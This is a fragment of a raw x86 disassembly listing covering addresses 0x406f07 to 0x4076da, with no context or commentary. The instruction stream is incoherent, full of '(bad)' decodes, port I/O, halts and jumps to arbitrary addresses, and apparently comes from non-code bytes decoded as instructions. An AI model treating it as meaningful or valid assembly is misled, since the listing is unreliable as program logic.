  406f07:	xchg   edi,eax
  406f08:	scas   eax,DWORD PTR es:[edi]
  406f09:	repnz es inc esp
  406f0c:	xchg   esp,eax
  406f0d:	js     0x406ee8
  406f0f:	repnz dec ebp
  406f11:	jl     0x406eda
  406f13:	dec    esp
  406f14:	or     cl,0x67
  406f17:	dec    edx
  406f18:	push   ss
  406f19:	add    al,0x33
  406f1b:	sbb    BYTE PTR [ebx+esi*2-0x41b7cd92],dl
  406f22:	in     eax,dx
  406f23:	and    BYTE PTR [eax+0x5b07e6b3],dl
  406f29:	mov    ebp,0x76e45ea5
  406f2e:	lea    eax,[esi]
  406f30:	cs pop edi
  406f32:	xchg   DWORD PTR [ebp+0x17],eax
  406f35:	or     BYTE PTR [ecx],dh
  406f37:	push   ds
  406f38:	mov    dl,0x6a
  406f3a:	mov    edx,es
  406f3c:	ret    0x772a
  406f3f:	fs dec ecx
  406f41:	push   eax
  406f42:	sbb    cl,dh
  406f44:	aad    0x71
  406f46:	outs   dx,BYTE PTR ds:[esi]
  406f47:	sbb    eax,0xc4a1ffd
  406f4c:	sub    DWORD PTR [eax+0x11],ebp
  406f4f:	out    dx,eax
  406f50:	ins    BYTE PTR es:[edi],dx
  406f51:	xchg   ebx,eax
  406f52:	sbb    ecx,ebp
  406f54:	shr    BYTE PTR [ecx+eax*8+0x7e40dedf],cl
  406f5b:	gs adc eax,0x53c6bd52
  406f61:	push   esp
  406f62:	sbb    edi,DWORD PTR [edi+0x1a]
  406f65:	mov    ebp,0x51887330
  406f6a:	jg     0x406fbc
  406f6c:	icebp  
  406f6d:	dec    edi
  406f6e:	fdiv   QWORD PTR [esi+eiz*4]
  406f71:	cmp    BYTE PTR [ebx+ebx*8+0x5b41491c],bl
  406f78:	jl     0x406ff0
  406f7a:	xchg   edi,eax
  406f7b:	popa   
  406f7c:	call   0xf4463713
  406f81:	aas    
  406f82:	jl     0x406f9e
  406f84:	mov    ds:0x58e9cc1d,al
  406f89:	jmp    0x406f50
  406f8b:	js     0x406f8d
  406f8d:	add    BYTE PTR [esp+ebx*4-0x3e],ch
  406f91:	out    dx,eax
  406f92:	adc    eax,0x5ac77716
  406f97:	jb     0x406f84
  406f99:	fisubr WORD PTR [edx-0x355191c0]
  406f9f:	cld    
  406fa0:	sti    
  406fa1:	dec    edi
  406fa2:	xchg   esi,eax
  406fa3:	pop    es
  406fa4:	jecxz  0x407014
  406fa6:	rol    BYTE PTR [edx],1
  406fa8:	les    esi,FWORD PTR ds:0xb3818664
  406fae:	loope  0x406f90
  406fb0:	adc    al,0x99
  406fb2:	ss int3 
  406fb4:	out    dx,eax
  406fb5:	hlt    
  406fb6:	pop    ebx
  406fb7:	ss mov edx,0x359d8568
  406fbd:	jnp    0x406f71
  406fbf:	shr    bl,0xf8
  406fc2:	loop   0x407037
  406fc4:	xor    BYTE PTR [edi+0x2436631c],dh
  406fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fcb:	mov    edi,0x9fb46ffc
  406fd0:	inc    ecx
  406fd1:	hlt    
  406fd2:	mov    BYTE PTR [edi],dl
  406fd4:	push   edx
  406fd5:	mov    edx,0xd615bb99
  406fda:	inc    edi
  406fdb:	cld    
  406fdc:	inc    esp
  406fdd:	mov    edx,0x35537407
  406fe2:	cmp    DWORD PTR [edi+0x54],edx
  406fe5:	dec    esp
  406fe6:	xchg   edx,eax
  406fe7:	pop    es
  406fe8:	cmp    DWORD PTR [eax-0x4d],edx
  406feb:	sar    BYTE PTR [edi-0x78],0x2f
  406fef:	xchg   eax,esp
  406ff1:	sub    BYTE PTR [ebp+0x122ac984],ah
  406ff7:	sbb    al,0x64
  406ff9:	cmp    BYTE PTR [ebp+edi*1-0x3],ch
  406ffd:	aad    0xaa
  406fff:	test   BYTE PTR [edx-0x3d],0xf6
  407003:	lea    esp,[eax+0x7140ca0e]
  407009:	dec    edx
  40700a:	ret    
  40700b:	scas   eax,DWORD PTR es:[edi]
  40700c:	loope  0x40702c
  40700e:	fnstsw ax
  407010:	ds jle 0x40700b
  407013:	and    esi,edi
  407015:	je     0x407059
  407017:	std    
  407018:	call   0xb6be:0xf089f3e0
  40701f:	lods   eax,DWORD PTR ds:[esi]
  407020:	or     bh,BYTE PTR [eax-0x12afe87c]
  407026:	call   0x289198f0
  40702b:	ins    BYTE PTR es:[edi],dx
  40702c:	ret    0x4721
  40702f:	inc    esi
  407030:	shl    dh,0x84
  407033:	jmp    0x9d2f6c33
  407038:	inc    esp
  407039:	inc    esp
  40703a:	cdq    
  40703b:	inc    esp
  40703c:	(bad)  
  40703d:	jne    0x40709e
  40703f:	shl    DWORD PTR [edi],1
  407041:	and    DWORD PTR [eax],eax
  407043:	mov    ecx,0xabaa6e5d
  407048:	inc    edi
  407049:	mov    dh,0x2b
  40704b:	(bad)  
  40704c:	fimul  DWORD PTR [esi]
  40704e:	pop    ebx
  40704f:	ret    0xaa2d
  407052:	jnp    0x4070ab
  407054:	adc    al,0x41
  407056:	xor    bl,BYTE PTR [eax]
  407058:	out    0x67,al
  40705a:	or     eax,eax
  40705c:	push   0xd1bee095
  407061:	jb     0x407027
  407063:	outs   dx,DWORD PTR ds:[esi]
  407064:	cmc    
  407065:	sub    eax,0x63a47d16
  40706a:	outs   dx,BYTE PTR ds:[esi]
  40706b:	in     al,dx
  40706c:	push   cs
  40706d:	cs jb  0x407091
  407070:	in     eax,dx
  407071:	(bad)  
  407072:	mov    dl,0x58
  407074:	push   0xce70d18e
  407079:	xchg   edx,eax
  40707a:	hlt    
  40707b:	mov    ecx,0x852a5d36
  407080:	fldenv [edi+0x22b6a2df]
  407086:	outs   dx,BYTE PTR ds:[esi]
  407087:	mov    fs,esp
  407089:	sub    esi,eax
  40708b:	push   esi
  40708c:	mov    ds:0x7b1275d,eax
  407091:	sti    
  407092:	daa    
  407093:	call   0x7c48dcd3
  407098:	sub    ebp,eax
  40709a:	sbb    DWORD PTR [ecx+0x23bf688f],esi
  4070a0:	add    eax,0x751b5b6c
  4070a5:	or     esi,ecx
  4070a7:	(bad)  
  4070a8:	aaa    
  4070a9:	adc    al,0x9c
  4070ab:	jg     0x4070d1
  4070ad:	lds    ebp,FWORD PTR [edi]
  4070af:	pop    ecx
  4070b0:	cli    
  4070b1:	outs   dx,BYTE PTR ds:[esi]
  4070b2:	adc    DWORD PTR [edx-0x4f],0xfffffffc
  4070b6:	sbb    al,0x4e
  4070b8:	ins    BYTE PTR es:[edi],dx
  4070b9:	into   
  4070ba:	inc    ebp
  4070bb:	nop
  4070bc:	fimul  WORD PTR [esi+0x46]
  4070bf:	xchg   edx,eax
  4070c0:	dec    edx
  4070c1:	xlat   BYTE PTR ds:[ebx]
  4070c2:	fmul   QWORD PTR [ebx]
  4070c4:	pop    es
  4070c5:	out    0xf0,al
  4070c7:	mov    WORD PTR [edx],?
  4070c9:	popf   
  4070ca:	sbb    al,0x4e
  4070cc:	xchg   BYTE PTR [edi+0x25],bh
  4070cf:	(bad)  
  4070d0:	in     eax,dx
  4070d1:	inc    edx
  4070d2:	sahf   
  4070d3:	push   ecx
  4070d4:	adc    al,0x2f
  4070d6:	mov    ch,0x6b
  4070d8:	(bad)  
  4070da:	push   edx
  4070db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070dc:	xor    dl,BYTE PTR [esi]
  4070de:	fidiv  WORD PTR ds:0xa60d3bc0
  4070e4:	clc    
  4070e5:	pop    ds
  4070e6:	shl    DWORD PTR [esp+ecx*1],0x6e
  4070ea:	pop    edi
  4070eb:	or     BYTE PTR [ebp-0x59],0xdb
  4070ef:	out    0xfb,eax
  4070f1:	add    BYTE PTR [edi-0x35],dh
  4070f4:	xchg   DWORD PTR [edi-0x2a],edx
  4070f7:	sub    cl,bh
  4070f9:	mov    bl,cl
  4070fb:	ins    BYTE PTR es:[edi],dx
  4070fc:	call   edx
  4070fe:	pop    edi
  4070ff:	mov    ah,0x1a
  407101:	push   ecx
  407102:	sub    eax,0x12de9e62
  407107:	aaa    
  407108:	and    eax,0x8dee644a
  40710d:	not    BYTE PTR ds:0xa9cdda10
  407113:	mov    esp,0xf1117757
  407118:	imul   ecx,esi,0x67
  40711b:	out    0x47,eax
  40711d:	bound  edx,QWORD PTR [ebx+0x4a]
  407120:	xchg   edx,eax
  407121:	test   DWORD PTR [ecx],eax
  407123:	repnz adc eax,0xf4ca0fc4
  407129:	push   edi
  40712a:	retf   
  40712b:	icebp  
  40712c:	fsub   st,st(3)
  40712e:	(bad)  
  40712f:	sbb    DWORD PTR [ebp-0x46],0x7ae2f382
  407136:	rcl    ch,0x2d
  407139:	inc    edi
  40713a:	pop    es
  40713b:	ror    dl,0x10
  40713e:	inc    edi
  40713f:	es xchg dh,ch
  407142:	test   DWORD PTR [esi-0x7a],edi
  407145:	pop    edx
  407146:	pop    ebx
  407147:	dec    ebx
  407148:	fsub   DWORD PTR [edx+ebp*2-0x229c9cf4]
  40714f:	ret    0x2ec7
  407152:	mov    BYTE PTR [edi-0x45938a65],al
  407158:	ja     0x40718b
  40715a:	sbb    cl,dh
  40715c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40715d:	inc    esp
  40715e:	sar    BYTE PTR ds:0xa44a4916,cl
  407164:	and    DWORD PTR [ecx+0x5342dbb9],0xb2d7602
  40716e:	shl    BYTE PTR [esp+edx*1-0x45b71bbb],1
  407175:	and    dl,dl
  407177:	loop   0x407152
  407179:	xchg   ebp,eax
  40717a:	sub    eax,DWORD PTR [eax-0x7e]
  40717d:	(bad)  
  40717f:	repnz pop ebp
  407181:	push   0x47313396
  407186:	out    dx,al
  407187:	inc    edi
  407188:	mov    edi,0xa4c6e775
  40718d:	jl     0x407120
  40718f:	mov    ecx,0x40c5476a
  407194:	loope  0x4071b5
  407196:	xor    eax,0x5e1b602
  40719b:	ds sub bl,ch
  40719e:	inc    DWORD PTR [eax]
  4071a0:	out    dx,eax
  4071a1:	loope  0x40715a
  4071a3:	hlt    
  4071a4:	outs   dx,BYTE PTR ds:[esi]
  4071a5:	or     esi,DWORD PTR [edx]
  4071a7:	cli    
  4071a8:	(bad)  
  4071a9:	cmp    al,0xbf
  4071ab:	sbb    bh,BYTE PTR [ebp-0x62]
  4071ae:	mov    dl,ah
  4071b0:	pop    edi
  4071b1:	cmp    ecx,esp
  4071b3:	sbb    bl,BYTE PTR [eax]
  4071b5:	shr    BYTE PTR [ebx-0x62],0x12
  4071b9:	mov    cl,0xaf
  4071bb:	jmp    0x4071d5
  4071bd:	leave  
  4071be:	popa   
  4071bf:	push   ecx
  4071c0:	mov    esp,0x7e637133
  4071c5:	fwait
  4071c6:	add    BYTE PTR [ebp-0x3b83b82d],cl
  4071cc:	mov    esi,DWORD PTR [ecx]
  4071ce:	mov    esi,0x83165c4e
  4071d3:	sub    eax,0x9933aa51
  4071d8:	call   FWORD PTR [edx-0x9f32313]
  4071de:	xor    BYTE PTR [esi],bl
  4071e0:	inc    edi
  4071e1:	rcl    BYTE PTR [edx],1
  4071e3:	mov    edx,0x2ac3c379
  4071e8:	clc    
  4071e9:	sub    BYTE PTR [edx],cl
  4071eb:	dec    eax
  4071ec:	out    0x6f,al
  4071ee:	test   eax,0xb7b7202
  4071f3:	ret    
  4071f4:	loop   0x407194
  4071f6:	cdq    
  4071f7:	inc    ebp
  4071f8:	retf   
  4071f9:	sbb    ebx,esi
  4071fb:	xor    eax,0x3fa76e14
  407200:	mov    bl,0x79
  407202:	mov    ebx,0xdb89f481
  407207:	adc    al,0xdb
  407209:	and    DWORD PTR [eax+0x3d],eax
  40720c:	push   ss
  40720d:	mov    edi,0x734a31b
  407212:	jne    0x407206
  407214:	xor    eax,0xa801f499
  407219:	sbb    eax,0xf8df819c
  40721e:	push   esi
  40721f:	jo     0x4071d6
  407221:	or     ch,BYTE PTR [esi]
  407223:	test   ebx,edi
  407225:	xor    eax,0x30a52dbb
  40722a:	pop    es
  40722b:	lods   eax,DWORD PTR ds:[esi]
  40722c:	add    BYTE PTR [eax-0x57],bl
  40722f:	xchg   esi,eax
  407230:	das    
  407231:	clc    
  407232:	pop    edx
  407233:	stos   DWORD PTR es:[edi],eax
  407234:	mov    ch,0x2d
  407236:	popa   
  407237:	or     esp,edx
  407239:	dec    esi
  40723a:	pop    ebp
  40723b:	scas   eax,DWORD PTR es:[edi]
  40723c:	dec    eax
  40723d:	jle    0x4072bd
  40723f:	pusha  
  407240:	pop    ds
  407241:	outs   dx,BYTE PTR cs:[esi]
  407243:	out    0xef,al
  407245:	call   0x14c8:0x6a320170
  40724c:	xchg   edx,eax
  40724d:	jp     0x407230
  40724f:	daa    
  407250:	push   edx
  407251:	retf   0x6f79
  407254:	popf   
  407255:	add    bh,dh
  407257:	mov    edi,0x55662809
  40725c:	or     BYTE PTR [ebx],dl
  40725e:	pop    esi
  40725f:	clc    
  407260:	loope  0x407256
  407262:	pop    ecx
  407263:	mov    eax,0x59ac95d8
  407268:	dec    esp
  407269:	mov    ds:0x35f8007f,eax
  40726e:	mov    dh,0x4a
  407270:	xchg   esp,eax
  407271:	cmp    al,0x9c
  407273:	aad    0x43
  407275:	repz and eax,esi
  407278:	jmp    0x9d5b:0xbdb9abf6
  40727f:	ins    BYTE PTR es:[edi],dx
  407280:	xchg   BYTE PTR [edx-0x5a3ae36b],cl
  407286:	fcom   QWORD PTR [edx-0x48]
  407289:	test   esi,ebp
  40728b:	aad    0xea
  40728d:	mov    bh,0x39
  40728f:	aaa    
  407290:	lea    ebp,[ebx+0x8]
  407293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407294:	push   ebp
  407295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407296:	mov    ch,BYTE PTR [esi-0x21]
  407299:	test   BYTE PTR [eax],al
  40729b:	cmc    
  40729c:	daa    
  40729d:	or     bl,BYTE PTR [edi+0x74]
  4072a0:	cmp    eax,0x472a71c9
  4072a5:	pop    ebx
  4072a6:	pop    edi
  4072a7:	(bad)  
  4072a8:	mov    dh,BYTE PTR [edx]
  4072aa:	xchg   ecx,eax
  4072ab:	out    dx,al
  4072ac:	sub    DWORD PTR [edx+0x15],ebx
  4072af:	jns    0x40728f
  4072b1:	cmp    edi,DWORD PTR [eax]
  4072b3:	pop    eax
  4072b4:	push   eax
  4072b5:	pop    ebp
  4072b6:	arpl   WORD PTR [ebx-0x6b26e12a],bp
  4072bc:	rol    DWORD PTR [edi+eax*2+0x5e],cl
  4072c0:	lock jge 0x4072c0
  4072c3:	xor    eax,eax
  4072c5:	pushf  
  4072c6:	aas    
  4072c7:	pushf  
  4072c8:	sbb    DWORD PTR [ebx],ebp
  4072ca:	ins    DWORD PTR es:[edi],dx
  4072cb:	shl    BYTE PTR [ebx+0x72],0xff
  4072cf:	cmp    esp,DWORD PTR [ecx-0x3102c38f]
  4072d5:	sub    eax,0x5f631ae8
  4072da:	cld    
  4072db:	addr16 or eax,0x6570b171
  4072e1:	loopne 0x407297
  4072e3:	xchg   BYTE PTR [edx+ebp*4-0x1dde5220],cl
  4072ea:	push   eax
  4072eb:	dec    edx
  4072ec:	and    eax,0x73d1c538
  4072f1:	sub    BYTE PTR [eax],cl
  4072f3:	sti    
  4072f4:	sub    BYTE PTR [eax],ch
  4072f6:	and    BYTE PTR [eax],al
  4072f8:	inc    edi
  4072f9:	outs   dx,DWORD PTR ds:[esi]
  4072fa:	das    
  4072fb:	pop    ebx
  4072fc:	inc    dl
  4072fe:	mov    esi,0xa775ab4a
  407303:	xor    DWORD PTR [eax+0x58d69192],0xbf01250a
  40730d:	jno    0x407368
  40730f:	mov    dl,0x1a
  407311:	loope  0x407315
  407313:	rcl    BYTE PTR [ecx-0x3d],0x55
  407317:	sub    edi,DWORD PTR [eax]
  407319:	into   
  40731a:	mov    ebp,0x85ad61b9
  40731f:	in     eax,dx
  407320:	ja     0x4072e3
  407322:	pop    es
  407323:	stos   DWORD PTR es:[edi],eax
  407324:	(bad)
  407327:	(bad)  
  407328:	cmp    eax,0xa363aef3
  40732d:	std    
  40732e:	sahf   
  40732f:	cld    
  407330:	or     dh,BYTE PTR [eax+0x13e432c2]
  407336:	inc    ebx
  407337:	pop    esp
  407338:	xchg   edx,esi
  40733a:	mov    dh,0x50
  40733c:	int3   
  40733d:	xchg   edi,eax
  40733e:	gs es mov cl,0x1c
  407342:	jle    0x4072d3
  407344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407345:	xchg   esi,eax
  407346:	mov    ecx,0x127ffea4
  40734b:	and    ah,ch
  40734d:	cmc    
  40734e:	mov    edx,0xdcedd1b5
  407353:	cwde   
  407354:	sbb    bl,0x42
  407357:	mov    ch,0x25
  407359:	scas   eax,DWORD PTR es:[edi]
  40735a:	xor    BYTE PTR [edx+edx*8+0x47],dh
  40735e:	ja     0x407325
  407360:	mov    esp,0xe255e9c2
  407365:	mov    BYTE PTR [edx+0x66],bl
  407368:	add    al,BYTE PTR [eax+eiz*2-0x22]
  40736c:	mov    dh,0x65
  40736e:	mov    esp,DWORD PTR [edx+0x3c]
  407371:	int3   
  407372:	arpl   WORD PTR [ebp+0x24],cx
  407375:	test   al,0x23
  407377:	lock dec edx
  407379:	in     eax,dx
  40737a:	cmc    
  40737b:	or     DWORD PTR [ebx+0x5a],ebp
  40737e:	xor    eax,0x2b
  407381:	add    eax,DWORD PTR [eax-0x4627b6be]
  407387:	jae    0x407332
  407389:	inc    esi
  40738a:	xor    edi,DWORD PTR [eax-0x65ee4ae2]
  407390:	pushf  
  407391:	xor    bh,al
  407393:	pop    ds
  407394:	jle    0x4073e4
  407396:	mov    al,0x41
  407398:	js     0x40733d
  40739a:	dec    ebx
  40739b:	popa   
  40739c:	imul   DWORD PTR [edi]
  40739e:	mov    edi,0x890fea9a
  4073a3:	mov    BYTE PTR [esi],bh
  4073a5:	aaa    
  4073a6:	adc    ebx,edi
  4073a8:	mov    DWORD PTR [ecx-0x2e9bf62a],ebx
  4073ae:	into   
  4073af:	jle    0x407352
  4073b1:	outs   dx,BYTE PTR ds:[esi]
  4073b2:	inc    ebp
  4073b3:	clc    
  4073b4:	inc    edx
  4073b5:	lods   al,BYTE PTR ds:[esi]
  4073b6:	add    eax,DWORD PTR [eax]
  4073b8:	adc    eax,0x4c169b92
  4073bd:	pusha  
  4073be:	pop    es
  4073bf:	repz ja 0x40740c
  4073c2:	cli    
  4073c3:	fsub   DWORD PTR [edx-0x2f]
  4073c6:	and    bh,BYTE PTR [edx]
  4073c8:	xor    esi,DWORD PTR ds:0x47880822
  4073ce:	inc    ebx
  4073cf:	out    0x6,al
  4073d1:	shr    DWORD PTR ds:[edx],cl
  4073d4:	clc    
  4073d5:	scas   eax,DWORD PTR es:[edi]
  4073d6:	lea    edi,ds:0xfba5633
  4073dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4073dd:	daa    
  4073de:	pop    edi
  4073df:	xchg   ebp,eax
  4073e0:	bnd jb 0x4073ef
  4073e3:	lock jp 0x40738f
  4073e6:	add    DWORD PTR [edx],ecx
  4073e8:	fldcw  WORD PTR [ebx]
  4073ea:	test   DWORD PTR [ecx+0x29de06e1],0x24c6b9bf
  4073f4:	enter  0x2e32,0x4
  4073f8:	or     al,BYTE PTR [eax+0x4f47661]
  4073fe:	in     eax,dx
  4073ff:	push   ecx
  407400:	push   ebp
  407401:	popf   
  407402:	ficomp WORD PTR [ecx-0x12d0ee87]
  407408:	loop   0x407487
  40740a:	(bad)  
  40740b:	loopne 0x407481
  40740d:	jns    0x407422
  40740f:	fnsetpm(287 only) 
  407411:	aaa    
  407412:	jge    0x407418
  407414:	shl    BYTE PTR [ecx-0x14],0x5e
  407418:	rcl    DWORD PTR [esi-0x61c53400],1
  40741e:	sub    eax,0xa9854c8e
  407423:	pop    es
  407424:	inc    esp
  407425:	jg     0x4073d3
  407427:	mov    al,ds:0x16988ae9
  40742c:	xor    DWORD PTR [ecx-0x79],edx
  40742f:	ret    
  407430:	cdq    
  407431:	mov    esp,0xb9f1380e
  407436:	and    al,0x40
  407438:	mov    esi,0x45bae99e
  40743d:	push   0xffffffe6
  40743f:	dec    cl
  407441:	sbb    BYTE PTR [ebp+0x217ebfb0],dh
  407447:	addr16 cmp eax,ebx
  40744a:	mov    ds:0xcf1268a2,eax
  40744f:	shl    BYTE PTR [edx-0x6c657005],cl
  407455:	xchg   esi,eax
  407456:	adc    bh,BYTE PTR [ebx+0x4f]
  407459:	test   edi,esi
  40745b:	mov    ah,0x46
  40745d:	gs sub eax,0xf497dd4a
  407463:	mov    WORD PTR [ebx-0x74],cs
  407466:	rol    DWORD PTR [edx+edi*8+0x7f07e36],cl
  40746d:	test   BYTE PTR ds:0x14fee7d7,al
  407473:	hlt    
  407474:	ret    
  407475:	jo     0x407446
  407477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407478:	mov    ebx,0xa9a513bc
  40747d:	sbb    eax,0xc0221880
  407482:	jl     0x40744e
  407484:	jg     0x40742f
  407486:	mov    al,ds:0xd2fa8a6a
  40748b:	dec    edx
  40748c:	sub    al,0x8d
  40748e:	jmp    0xb1df:0x6ab6031f
  407495:	jmp    0x4074c7
  407497:	test   eax,0x5eabdea0
  40749c:	out    0x60,al
  40749e:	mov    cl,bl
  4074a0:	and    eax,0xb2877c1c
  4074a5:	aaa    
  4074a6:	aas    
  4074a7:	sbb    al,0xfc
  4074a9:	adc    ch,BYTE PTR [ebx+edi*4]
  4074ac:	out    0x6d,al
  4074ae:	jl     0x40747c
  4074b0:	mov    ch,0xd
  4074b2:	push   ebx
  4074b3:	xchg   edx,eax
  4074b4:	or     ebp,DWORD PTR [eax-0x7c]
  4074b7:	fisttp QWORD PTR [ebp+0x2af99c5d]
  4074bd:	(bad)  [edi]
  4074bf:	int    0x2d
  4074c1:	jbe    0x407478
  4074c3:	mov    ds:0xe87c0759,al
  4074c8:	or     BYTE PTR [edx+0x38aa7aad],dl
  4074ce:	adc    al,0x56
  4074d0:	dec    edi
  4074d1:	mov    BYTE PTR [ebx+edi*2],ah
  4074d4:	mov    dl,0x69
  4074d6:	popf   
  4074d7:	xor    eax,0xb4ab6507
  4074dc:	mov    bh,0x48
  4074de:	in     al,dx
  4074df:	jnp    0x40747f
  4074e1:	fidivr WORD PTR [edx+0x188343d0]
  4074e7:	add    edi,esp
  4074e9:	sar    bh,0x37
  4074ec:	stc    
  4074ed:	mov    ds:0x5920d5d5,al
  4074f2:	inc    esi
  4074f3:	pushf  
  4074f4:	jl     0x4074c3
  4074f6:	mov    DWORD PTR [eax-0x2957c580],0xda64cdb8
  407500:	test   DWORD PTR [esp+ebx*1+0x6b],ebp
  407504:	mov    edx,0x9ff3c2d0
  407509:	xor    eax,0x1430dce1
  40750e:	and    eax,0x3d6fc774
  407513:	adc    BYTE PTR [ecx-0xd],al
  407516:	adc    al,0xb4
  407518:	cld    
  407519:	add    dh,BYTE PTR [ecx+0x556f7298]
  40751f:	mov    al,0x5a
  407521:	dec    esp
  407522:	repnz cmp eax,0xe1ba994a
  407528:	aas    
  407529:	add    edi,DWORD PTR [eax]
  40752b:	data16 cli 
  40752d:	(bad)  
  40752e:	gs dec esi
  407530:	push   esp
  407531:	call   0x5b41b2fe
  407536:	xor    eax,0xc421b4c1
  40753b:	push   ds
  40753c:	data16 mov dh,0x5b
  40753f:	adc    al,0x5e
  407541:	push   esp
  407542:	dec    edi
  407543:	js     0x40757c
  407545:	shl    DWORD PTR [ebp+0x4a],0x87
  407549:	popa   
  40754a:	inc    eax
  40754b:	jb     0x407598
  40754d:	popa   
  40754e:	jae    0x407529
  407550:	pop    ebx
  407551:	push   edi
  407552:	mov    cs,WORD PTR [edx-0x309a6225]
  407558:	test   al,0x51
  40755a:	fs mov ebp,0xe12a3ed0
  407560:	lock into 
  407562:	bound  ecx,QWORD PTR [eax]
  407564:	aaa    
  407565:	mov    cl,0xfa
  407567:	sbb    DWORD PTR [edx+0x6b6ce197],eax
  40756d:	outs   dx,BYTE PTR ds:[esi]
  40756e:	fwait
  40756f:	dec    edi
  407570:	and    BYTE PTR [edi],dl
  407572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407573:	xor    eax,0x8dba7924
  407578:	loope  0x40753c
  40757a:	mov    ds:0x19fe36cc,eax
  40757f:	or     bh,bh
  407581:	xchg   esp,eax
  407582:	adc    ch,BYTE PTR [edx-0x63f8827c]
  407588:	cmovg  edi,DWORD PTR [edx+eax*1]
  40758c:	aam    0x4e
  40758e:	pop    ds
  40758f:	(bad)  
  407590:	in     eax,0xe3
  407592:	adc    DWORD PTR [eax],ebp
  407594:	pop    es
  407595:	adc    eax,0x84a8477e
  40759a:	(bad)  
  40759b:	pop    ss
  40759c:	push   eax
  40759d:	leave  
  40759e:	into   
  40759f:	mov    esp,0x368342ea
  4075a4:	mov    ecx,0x3b59cdae
  4075a9:	imul   ebp,DWORD PTR ds:0x5346bb4,0x7384b4ac
  4075b3:	dec    ebx
  4075b4:	push   0x52
  4075b6:	imul   ebx,DWORD PTR [esi+0x2a],0xb2e26156
  4075bd:	test   esi,eax
  4075bf:	shl    BYTE PTR [eax+0x356246cf],0x67
  4075c6:	iret   
  4075c7:	call   0xa8a3842f
  4075cc:	cmp    DWORD PTR ds:0x38d67196,ecx
  4075d2:	cdq    
  4075d3:	mov    eax,0xac1f2ee7
  4075d8:	adc    BYTE PTR [esi],bl
  4075da:	repnz out 0x7,al
  4075dd:	cdq    
  4075de:	in     eax,0x1f
  4075e0:	scas   al,BYTE PTR es:[edi]
  4075e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075e4:	sub    al,BYTE PTR [ecx+0x778c71f1]
  4075ea:	push   ds
  4075eb:	mov    esi,0x7ba82cff
  4075f0:	repnz idiv DWORD PTR [ebx-0x72e5a64]
  4075f7:	xor    dh,dl
  4075f9:	jo     0x40759e
  4075fb:	jmp    FWORD PTR [ebx]
  4075fd:	pop    edx
  4075fe:	inc    edx
  4075ff:	loope  0x4075ae
  407601:	out    dx,al
  407602:	mov    fs,esp
  407604:	xchg   BYTE PTR [esi-0x112ae27a],ah
  40760a:	fist   WORD PTR [edx+0x68]
  40760d:	cli    
  40760e:	jecxz  0x40768a
  407610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407611:	(bad)  
  407612:	pop    es
  407613:	push   0xffffffc5
  407615:	and    DWORD PTR [ecx],0x32f9fa38
  40761b:	ficom  WORD PTR [edi-0x6c]
  40761f:	ins    DWORD PTR es:[edi],dx
  407620:	stos   DWORD PTR es:[edi],eax
  407621:	add    dh,dh
  407623:	xor    ebx,esi
  407625:	sar    edi,1
  407627:	push   ecx
  407628:	scas   eax,DWORD PTR es:[edi]
  407629:	and    DWORD PTR [edi+eiz*4],ecx
  40762c:	lods   al,BYTE PTR ds:[esi]
  40762d:	rol    BYTE PTR [ebx-0x5f],1
  407630:	out    0xb9,al
  407632:	or     DWORD PTR [ecx-0x32],0xffffff99
  407636:	daa    
  407637:	(bad)  
  407638:	adc    esi,ecx
  40763a:	out    dx,al
  40763b:	push   eax
  40763c:	mov    esi,0xae697ef5
  407641:	mov    edx,0xd0afd735
  407646:	clc    
  407647:	dec    eax
  407648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407649:	cdq    
  40764a:	div    BYTE PTR [ebx]
  40764c:	bound  ebp,QWORD PTR [ebx-0x29327bbd]
  407652:	imul   esp,DWORD PTR [si-0x4e],0x74
  407657:	ss pushf 
  407659:	clc    
  40765a:	mov    dh,0x70
  40765c:	adc    al,0xff
  40765e:	add    al,0xee
  407660:	ret    0xc41c
  407663:	inc    ebx
  407664:	shr    DWORD PTR [eax],cl
  407666:	pop    ebp
  407667:	lds    esi,FWORD PTR [ebx+0x136cae84]
  40766d:	test   BYTE PTR [edx-0x73],0xad
  407671:	repz test DWORD PTR [eax+0x5e],eax
  407675:	scas   al,BYTE PTR es:[edi]
  407676:	ja     0x4076e3
  407678:	or     eax,0xf13f8325
  40767d:	pop    eax
  40767e:	gs nop
  407680:	popf   
  407681:	into   
  407682:	mov    edi,0xf809d57e
  407687:	cs fnstsw WORD PTR cs:[esi]
  40768b:	pop    ecx
  40768c:	cmp    BYTE PTR [ebx+0x5b],dl
  40768f:	cdq    
  407690:	jp     0x407648
  407692:	shl    bh,0x22
  407695:	adc    esi,DWORD PTR [ebx+ebx*8+0x3a]
  407699:	in     al,dx
  40769a:	into   
  40769b:	enter  0x38a7,0x5b
  40769f:	mov    al,0x14
  4076a1:	cdq    
  4076a2:	push   ebp
  4076a3:	xlat   BYTE PTR ds:[ebx]
  4076a4:	push   ds
  4076a5:	outs   dx,BYTE PTR ds:[esi]
  4076a6:	pop    es
  4076a7:	int    0x88
  4076a9:	sbb    al,0x88
  4076ab:	push   esp
  4076ac:	jns    0x407679
  4076ae:	pop    ebx
  4076af:	mov    bh,0x26
  4076b1:	xchg   edx,eax
  4076b2:	sbb    eax,0xa5708213
  4076b7:	in     eax,dx
  4076b8:	and    esp,DWORD PTR [edx+0x51]
  4076bb:	push   edi
  4076bc:	stos   BYTE PTR es:[edi],al
  4076bd:	mov    ds:0xd02a299e,eax
  4076c2:	jmp    0x61dc4d24
  4076c7:	ds ss je 0x4076d3
  4076cb:	mov    edi,0x83c8dae0
  4076d0:	xor    al,0x7e
  4076d2:	dec    ebp
  4076d3:	sbb    al,0x19
  4076d5:	repz pop es
  4076d7:	push   ds
  4076d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076d9:	(bad)  
  4076da:	dec    DWORD PTR [ecx]
